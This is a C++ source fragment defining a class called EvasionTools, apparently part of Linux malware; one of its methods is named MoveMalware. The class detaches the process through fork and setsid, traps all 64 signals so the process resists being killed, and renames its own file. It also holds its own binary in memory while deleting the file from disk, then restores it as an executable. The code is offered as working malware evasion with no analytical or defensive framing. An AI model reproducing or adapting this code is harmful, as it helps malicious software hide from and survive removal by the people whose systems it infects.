class EvasionTools{
	private:
		int			    fd;
		int 			 tmpi1;
		int			 tmpi2;
		char*                tmpc=NULL;

	public:
		static void ChangePID(int _s=0){
                        int pid=fork();
                        int sid=setsid();
                        if (pid<0)exit(1);
                        if (pid>0)exit(0);
                        if (sid<0)exit(0);
                        if (sid>0);
		}
		void HandleAllSignals(function Handle){
			for (int tmp=1; tmp<=64; tmp++)
				signal(tmp, Handle);
		}
		void HandleSignal(int sig, function Handle){
			signal(sig, Handle);
		}
		int  MoveMalware(const char* newpath){
			if (rename(Current.name, newpath)!=0x00)
				return 1;

			strncpy(Current.name, newpath, 255);
			return 0;
		}
		int MoveIntoMemory(){
			fd=open(Current.name, O_RDONLY);

			if (fd == -1 || tmpc != NULL)
				return 1;

			tmpc=(char*)malloc(Current.size);
			read(fd, tmpc, Current.size);
			close(fd);
			if (remove(Current.name))
				return 1;
			return 0;
		}
		int MoveBackToDisk(const char* loc=Current.name){
			fd=open(loc, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IXUSR);

			if (fd == -1 || tmpc == NULL)
				return 1;

			write(fd, tmpc, Current.size);
			close(fd);

			return 0;
		}
};
